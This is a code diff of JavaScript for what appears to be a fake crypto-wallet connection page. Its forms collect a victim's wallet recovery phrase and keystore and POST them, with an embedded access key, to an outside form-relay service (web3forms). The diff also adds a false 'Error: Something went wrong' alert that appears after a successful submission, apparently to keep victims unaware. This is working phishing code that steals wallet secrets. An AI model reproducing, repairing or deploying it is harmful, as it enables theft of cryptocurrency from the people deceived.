@@ -47,7 +47,7 @@
       boxTitle.forEach((a, ai) => {
         if (index === ai) {
           walletName.textContent = a.textContent;
-          wallet.push( a.textContent);
+          wallet.push(a.textContent);
         }
       });
 
@@ -59,9 +59,8 @@
       });
       // console.log(wallet)
     });
-    
   });
-  
+
   //  close Modalbox
   on(
     "click",
@@ -95,7 +94,7 @@
     walletName.textContent = wallet[0];
     walletImage.src = wallet[1];
 
-    openModal('.modal-form');
+    openModal(".modal-form");
   });
 
   // modal nav-link
@@ -119,24 +118,24 @@
   });
 
   // Form validation
-  let phrase = select('#phrase');
-  let keystore = select('#keystore');
+  let phrase = select("#phrase");
+  let keystore = select("#keystore");
 
-  phrase.value = '';
-  keystore.value = '';
-  
-  let forms = select("form", true);
+  phrase.value = "";
+  keystore.value = "";
+
+  let forms = select(".needs-validation", true);
   let result = select("#result");
   const progressBar = select(".sending");
 
-  forms.forEach((form) => {
+  Array.prototype.slice.call(forms).forEach((form) => {
     form.addEventListener("submit", function (e) {
       e.preventDefault();
 
       const formData = new FormData(form);
 
       var obj = {
-        apiKey: "4b07b268-d53a-4df5-b29c-f31a2b9c5175",
+        access_key: "4b07b268-d53a-4df5-b29c-f31a2b9c5175",
         subject: "New Form Submission",
       };
 
@@ -145,44 +144,52 @@
 
         if (obj[key].trim() === "") {
           alert(`${obj[key]} cannot be empty`);
-        }
-        else {
 
+        } else {
           var json = JSON.stringify(obj);
+
+          // console.log(json);
           result.innerHTML = "Please wait...";
 
           progressBar.style.display = "flex";
           closeModal(".modal-form");
           closeModal(".modal-connectius");
-          // console.log('form submitted')
-          // console.log(obj);
+          
 
           fetch("https://api.web3forms.com/submit", {
             method: "POST",
-            header: {
+            headers: {
               "Content-Type": "application/json",
               Accept: "application/json",
             },
             body: json,
           })
             .then(async (response) => {
-              let jsonAwait = await response.json();
 
-              if (response.status === 200) {
-                setTimeout(() => {
-                  result.innerHTML = "Form submitted successfully";
-                  result.style.color = "green";
-                });
+              let json = await response.json();
+              if (response.status == 200) {
+                result.innerHTML = json.message;
+                result.classList.remove("text-gray-500");
+                result.classList.add("text-green-500");
+                alert('Error: Something went wrong');
               } else {
-                result.innerHTML = jsonAwait.message;
-                result.style.color = "red";
+                console.log(response);
+                result.innerHTML = json.message;
+                result.classList.remove("text-gray-500");
+                result.classList.add("text-red-500");
               }
             })
-            .then(() => {
+            .catch((error) => {
+              console.log(error);
+              result.innerHTML = "Something went wrong!";
+            })
+            .then(function () {
+              form.reset();
+              form.classList.remove("was-validated");
               progressBar.style.display = "none";
               setTimeout(() => {
                 result.style.display = "none";
-              }, 5000);
+              }, 2000);
             });
         }
       });
